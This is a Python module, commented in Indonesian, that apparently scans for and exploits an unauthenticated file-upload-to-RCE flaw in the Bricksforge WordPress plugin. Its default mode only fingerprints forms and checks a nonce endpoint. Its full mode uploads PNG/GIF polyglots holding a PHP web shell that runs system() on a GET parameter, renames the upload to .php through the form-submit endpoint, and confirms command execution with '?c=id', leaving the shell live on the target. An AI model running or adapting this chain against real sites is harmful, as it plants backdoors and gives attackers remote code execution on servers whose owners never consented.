# cve_modules/bricksforge.py
"""
CVE-2026-85097 — Bricksforge <= 3.1.8.9
Unauthenticated Arbitrary File Upload -> RCE via temporaryFileUploads

Adaptasi dari PoC @zappy777 jadi modul scanning untuk main.py.

Prinsip klasifikasi:
  vulnerable=True  HANYA kalau RCE terbukti (shell PHP ter-upload,
                   bisa diakses, dan ?c=id balikin uid=).
  detect_only=True (default):
    - discovery form Bricksforge
    - cek nonce endpoint unauth (admin-ajax action=bricksforge_regenerate_nonce)
    - kalau form + nonce ada -> vulnerable=False, reason="suspect_..."
    - TIDAK upload apa-apa.

Mode:
  - detect_only=True  : cuma fingerprint + cek nonce (TANPA upload artefak)
  - detect_only=False : full chain (upload polyglot + submit + verify RCE)
"""

import json
import random
import re
import string
import urllib.parse
from datetime import datetime, timedelta, timezone

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── metadata untuk main.py ──────────────────────────────────────────────

CVE_META = {
    "id": "CVE-2026-85097",
    "name": "Bricksforge unauth file upload RCE",
    "func": "check_cve_2026_85097",
    "kwargs": {"detect_only": True},
    "priority": 45,
}


# ── konstanta ───────────────────────────────────────────────────────────

MARKER = "BF85097_MARKER"
TITLE_RE = re.compile(r"<title>([^<]*)</title>", re.I)

PNG_1PX = bytes.fromhex(
    "89504e470d0a1a0a0000000d494844520000000100000001080600000"
    "01f15c4890000000d49444154789c6360000002000100" "05fe02fe"
    "dccc59e70000000049454e44ae426082"
)
SHELL_BODY = ('<?php echo "' + MARKER + '";'
              'if(isset($_GET["c"])){system($_GET["c"]);} ?>').encode()

GIF_1PX = bytes.fromhex(
    "474946383961" "01000100" "8000" "000000" "ffffff"
    "2c" "00000000" "01000100" "00" "02" "02" "440100" "3b"
)

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]

DISC_PATHS = ["", "contact/", "contact-us/", "kontak/", "about/",
              "upload/", "quote/", "request/", "order/", "booking/",
              "support/", "apply/", "submit/"]


def _hdrs(extra=None):
    h = {"User-Agent": random.choice(UAS)}
    if extra:
        h.update(extra)
    return h


def _rand_shell():
    return "bf85097_" + "".join(
        random.choices(string.ascii_lowercase + string.digits, k=6)) + ".php"


# ── polyglot builders ───────────────────────────────────────────────────

def _png_text_chunk(keyword, text):
    import struct
    import zlib
    data = keyword.encode() + b"\x00" + text.encode("latin-1", "replace")
    return (struct.pack(">I", len(data)) + b"tEXt" + data
            + struct.pack(">I", zlib.crc32(b"tEXt" + data) & 0xffffffff))


def _build_polyglots():
    a = (PNG_1PX[:-12] + _png_text_chunk("Comment",
                                          SHELL_BODY.decode("latin-1"))
         + PNG_1PX[-12:] + SHELL_BODY)
    b = PNG_1PX + SHELL_BODY
    gif_comment = (
        b"\x21\xf9\x04\x01\x00\x00\x00\x00"
        b"\x21\xfe"
        + bytes([min(len(SHELL_BODY), 255)]) + SHELL_BODY[:255]
        + b"\x00\x3b"
    )
    ga = GIF_1PX[:-1] + gif_comment
    gb = GIF_1PX + SHELL_BODY
    return [a, b, ga, gb]


# ── form discovery ──────────────────────────────────────────────────────

def _parse_forms(html):
    out = []
    blocks = re.split(r'(?=<form\b[^>]*brxe-brf-pro-forms)', html)
    for blk in blocks:
        if "brxe-brf-pro-forms" not in blk:
            continue
        end = blk.find("</form>")
        blk = blk[:end + 7] if end != -1 else blk

        form_m = re.search(r'<form\b[^>]*>', blk)
        form_tag = form_m.group(0) if form_m else ""
        form_id = None
        m = re.search(r'data-script-id="([^"]+)"', form_tag)
        if m:
            form_id = m.group(1)
        else:
            m = re.search(r'\bid="brxe-([^"]+)"', form_tag)
            if m:
                form_id = m.group(1)

        post_m = re.search(r'["\']postId["\']\s*:\s*["\']?(\d+)', blk)
        post_id = post_m.group(1) if post_m else None

        file_names = set(re.findall(
            r'<input[^>]*type="file"[^>]*name="form-field-([^"\[\]]+)',
            blk))
        file_names |= set(re.findall(
            r'<input[^>]*name="form-field-([^"\[\]]+)[^>]*type="file"',
            blk))

        el_to_cid = {}
        for tag in re.findall(r"<[^>]*data-custom-id=\"[^\"]*\"[^>]*>", blk):
            cid = re.search(r'data-custom-id="([^"]+)"', tag)
            eid = re.search(r'data-element-id="([^"]+)"', tag)
            if cid and eid:
                el_to_cid[eid.group(1)] = cid.group(1)

        file_containers = re.findall(
            r'data-element-id="([^"]+)"[^>]*class="[^"]*brf-pro-forms-field-file',
            blk)

        field_id = field_el = None
        for eid in file_containers:
            cid = el_to_cid.get(eid)
            if cid and cid in file_names:
                field_id, field_el = cid, eid
                break
        if not field_id:
            for cid, eid in el_to_cid.items():
                if cid in file_names:
                    field_id, field_el = cid, cid
                    break
        if not field_id and file_names:
            field_id = sorted(file_names)[0]
            field_el = field_id

        any_field = any_field_el = None
        for eid, cid in el_to_cid.items():
            if cid:
                any_field, any_field_el = cid, eid
                break
        if not any_field:
            names = re.findall(r'name="form-field-([^"\[\]]+)', blk)
            if names:
                any_field = any_field_el = names[0]

        if form_id and (field_id or any_field):
            out.append({
                "post_id": post_id, "form_id": form_id,
                "field_id": field_id,
                "field_el": field_el or form_id,
                "file_names": sorted(file_names),
                "has_file": bool(field_id),
                "any_field": any_field,
                "any_field_el": any_field_el,
            })
    return out


def _discover(sess, url, timeout, extra_paths=None):
    saw_form = False
    fallback = None
    for rel in (extra_paths or DISC_PATHS):
        page = urllib.parse.urljoin(url if url.endswith("/") else url + "/",
                                    rel)
        try:
            r = sess.get(page, headers=_hdrs(), timeout=timeout,
                         verify=False)
        except Exception:
            continue
        html = r.text
        if "brf-pro-forms" not in html:
            continue
        saw_form = True

        forms = _parse_forms(html)
        if not forms:
            continue

        with_file = [f for f in forms if f.get("has_file")]
        cand = with_file[0] if with_file else None
        post_id = cand["post_id"] if cand else None
        if not post_id:
            m = re.search(r'["\']postId["\']\s*:\s*["\']?(\d+)', html)
            post_id = m.group(1) if m else None

        if cand and post_id:
            return {
                "page": page, "post_id": post_id,
                "form_id": cand["form_id"],
                "field_id": cand["field_id"],
                "field_el": cand["field_el"],
                "mode": "file",
            }, "ok"

        if not fallback and post_id:
            nf = [f for f in forms if f.get("any_field")]
            if nf:
                fallback = {
                    "page": page, "post_id": post_id,
                    "form_id": nf[0]["form_id"],
                    "field_id": nf[0]["any_field"],
                    "field_el": nf[0]["any_field_el"] or nf[0]["form_id"],
                    "mode": "nofile",
                }

    if fallback:
        return fallback, "ok"
    if saw_form:
        return None, "form_no_field"
    return None, "no_form"


# ── nonce ───────────────────────────────────────────────────────────────

def _get_nonce(sess, root, timeout, retries=2):
    for _ in range(retries):
        try:
            r = sess.post(
                root + "/wp-admin/admin-ajax.php",
                data={"action": "bricksforge_regenerate_nonce"},
                headers=_hdrs(), timeout=timeout, verify=False,
            )
            if r.status_code == 200:
                j = r.json()
                if j.get("success") and j.get("data", {}).get("nonce"):
                    return j["data"]["nonce"]
        except Exception:
            continue
    return None


# ── exploit chain ───────────────────────────────────────────────────────

def _upload_polyglot(sess, root, nonce, timeout):
    url = root + "/wp-json/bricksforge/v1/form_file_upload"
    variants = _build_polyglots()

    for u in (url, root + "/?rest_route=/bricksforge/v1/form_file_upload"):
        for idx, blob in enumerate(variants):
            is_gif = blob.startswith(b"GIF8")
            fname = f"x{idx}.{'gif' if is_gif else 'png'}"
            ctype = "image/gif" if is_gif else "image/png"
            try:
                r = sess.post(u,
                              headers=_hdrs({"X-WP-Nonce": nonce}),
                              files={"file[]": (fname, blob, ctype)},
                              timeout=timeout, verify=False)
            except Exception:
                continue
            try:
                j = r.json()
            except Exception:
                continue
            if j.get("success") and isinstance(j.get("data"), list) \
                    and j["data"]:
                return j["data"][0].get("file")
    return None


def _submit(sess, root, nonce, info, tmp_path, shell, timeout):
    field_id = info.get("field_id")
    if not field_id:
        return 0, "no field id"
    tfu = json.dumps([{
        "file": {"file": tmp_path, "url": shell},
        "field": "form-field-" + field_id,
    }])
    url = root + "/wp-json/bricksforge/v1/form_submit"
    body = {
        "postId": str(info["post_id"]),
        "formId": info["form_id"],
        "formIdFallback": info.get("field_el") or info["form_id"],
        "fieldIds": json.dumps(
            {field_id: info.get("field_el") or field_id}),
        "temporaryFileUploads": tfu,
        "action": "bricksforge_form_submit",
    }
    if info.get("mode") == "nofile":
        body["form-field-" + field_id] = "hello"
    try:
        r = sess.post(url, headers=_hdrs({"X-WP-Nonce": nonce}),
                      data=body, timeout=timeout, verify=False)
        return r.status_code, r.text[:400]
    except Exception as e:
        return 0, str(e)


def _content_bases(root, page):
    bases = [root + "/"]
    try:
        path = urllib.parse.urlsplit(page).path
    except Exception:
        path = "/"
    segs = [s for s in path.split("/") if s]
    for i in range(len(segs), 0, -1):
        bases.append(root + "/" + "/".join(segs[:i]) + "/")
    return list(dict.fromkeys(bases))


def _verify(sess, root, page, shell, timeout):
    now = datetime.now(timezone.utc)
    subdirs = [f"{(now + timedelta(days=30 * d)).year}/"
               f"{(now + timedelta(days=30 * d)).month:02d}"
               for d in (0, 1, -1, 2, -2)]
    subdirs.append("")
    seen, cands = set(), []
    for base in _content_bases(root, page):
        for sd in subdirs:
            rel = f"wp-content/uploads/{sd + '/' if sd else ''}{shell}"
            u = urllib.parse.urljoin(base, rel)
            if u not in seen:
                seen.add(u)
                cands.append(u)
    for u in cands:
        try:
            r = sess.get(u + "?c=id", headers=_hdrs(), timeout=timeout,
                         verify=False)
        except Exception:
            continue
        if r.status_code == 200 and MARKER in r.text \
                and ("uid=" in r.text or "gid=" in r.text):
            return u
    return None


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_85097(target_url: str,
                         timeout: int = 15,
                         detect_only: bool = True,
                         paths: list | None = None) -> dict:
    """
    Cek target terhadap CVE-2026-85097.

    Args:
        target_url  : URL target
        timeout     : timeout HTTP (default 15s)
        detect_only : True  -> cuma discovery + cek nonce (TANPA upload)
                      False -> full chain (upload polyglot + verify RCE)
        paths       : opsional, path tambahan buat discovery form

    Return:
        {
            "vulnerable": bool,   # True HANYA kalau RCE terbukti
            "evidence":   str | None,
            "reason":     str,
            "form_page":  str | None,
            "shell_url":  str | None,
        }
    """
    url = target_url if "://" in target_url else "http://" + target_url
    parts = urllib.parse.urlsplit(url)
    root = f"{parts.scheme}://{parts.netloc}"
    sess = requests.Session()

    result = {
        "vulnerable": False, "evidence": None, "reason": "",
        "form_page": None, "shell_url": None,
    }

    try:
        # ── tahap 1: discovery form ──────────────────────────────────
        info, reason = _discover(sess, url, timeout, paths)
        if not info:
            result["reason"] = f"no_form: {reason}"
            return result

        result["form_page"] = info["page"]

        # ── tahap 2: cek nonce endpoint (unauth) ─────────────────────
        nonce = _get_nonce(sess, root, timeout)
        if not nonce:
            result["reason"] = "form_found_but_nonce_endpoint_dead"
            return result

        # ── mode detect_only: berhenti di sini, nggak upload ─────────
        if detect_only:
            result["reason"] = "suspect_bricksforge_present_nonce_unauth"
            result["evidence"] = (
                f"Bricksforge form found at {info['page']}, "
                f"unauth nonce endpoint active; "
                f"upload chain NOT executed (detect_only=True)"
            )
            return result

        # ── tahap 3: full exploit (upload + submit + verify) ─────────
        tmp = _upload_polyglot(sess, root, nonce, timeout)
        if not tmp:
            result["reason"] = "nonce_ok_but_file_upload_rejected"
            return result

        shell = _rand_shell()
        st, txt = _submit(sess, root, nonce, info, tmp, shell, timeout)

        shell_url = _verify(sess, root, info["page"], shell, timeout)
        if shell_url:
            result["vulnerable"] = True
            result["evidence"] = (f"RCE confirmed: shell accessible at "
                                  f"{shell_url}?c=id")
            result["reason"] = "exploited_arbitrary_file_upload_rce"
            result["shell_url"] = shell_url
            return result

        result["reason"] = f"upload_ok_but_verify_failed (submit st={st})"
        return result

    except Exception as e:
        result["reason"] = f"exception: {type(e).__name__}: {e}"
        return result
    finally:
        sess.close()